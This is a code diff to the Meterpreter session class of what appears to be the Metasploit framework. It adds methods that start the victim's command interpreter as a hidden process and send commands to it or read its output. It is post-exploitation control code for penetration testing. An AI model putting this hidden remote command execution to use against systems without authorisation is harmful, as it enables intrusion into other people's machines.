@@ -25,6 +25,11 @@ class Meterpreter < Rex::Post::Meterpreter::Client
 	include Msf::Session::Interactive
 	include Msf::Session::Comm
 
+	#
+	# This interface supports interacting with a single command shell.
+	#
+	include Msf::Session::Provider::SingleCommandShell
+
 	include Msf::Session::Scriptable
 
 	# Override for server implementations that can't do ssl
@@ -74,6 +79,79 @@ class Meterpreter < Rex::Post::Meterpreter::Client
 	#
 	def type
 		self.class.type
+	end
+
+	def shell_init
+		return true if @shell
+
+		# COMSPEC is special-cased on all meterpreters to return a viable
+		# shell.
+		sh = fs.file.expand_path("%COMSPEC%")
+		@shell = sys.process.execute(sh, nil, { "Hidden" => true, "Channelized" => true })
+
+	end
+
+	#
+	# Read from the command shell.
+	#
+	def shell_read(length=nil, timeout=1)
+		shell_init
+
+		length = nil if length < 0
+		begin
+			rv = nil
+			# Meterpreter doesn't offer a way to timeout on the victim side, so
+			# we have to do it here.  I'm concerned that this will cause loss
+			# of data.
+			Timeout.timeout(timeout) {
+				rv = @shell.channel.read(length)
+			}
+			framework.events.on_session_output(self, rv) if rv
+			return rv
+		rescue ::Timeout::Error
+			return nil
+		rescue ::Exception => e
+			shell_close
+			raise e
+		end
+	end
+
+	#
+	# Write to the command shell.
+	#
+	def shell_write(buf)
+		shell_init
+
+		begin
+			framework.events.on_session_command(self, buf.strip)
+			len = @shell.channel.write(buf + "\r\n")
+		rescue ::Exception => e
+			shell_close
+			raise e
+		end
+	end
+
+	def shell_close
+		@shell.close
+		@shell = nil
+	end
+
+	def shell_command(cmd)
+		# Send the shell channel's stdin.
+		shell_write(cmd + "\n")
+
+		timeout = 5
+		etime = ::Time.now.to_f + timeout
+		buff = ""
+		
+		# Keep reading data until no more data is available or the timeout is 
+		# reached. 
+		while (::Time.now.to_f < etime)
+			res = shell_read(-1, 0.1)
+			buff << res if res
+		end
+
+		buff
 	end
 
 	#
@@ -168,7 +246,7 @@ class Meterpreter < Rex::Post::Meterpreter::Client
 	end
 
 	#
-	# Explicitly runs a command.
+	# Explicitly runs a command in the meterpreter console.
 	#
 	def run_cmd(cmd)
 		console.run_single(cmd)
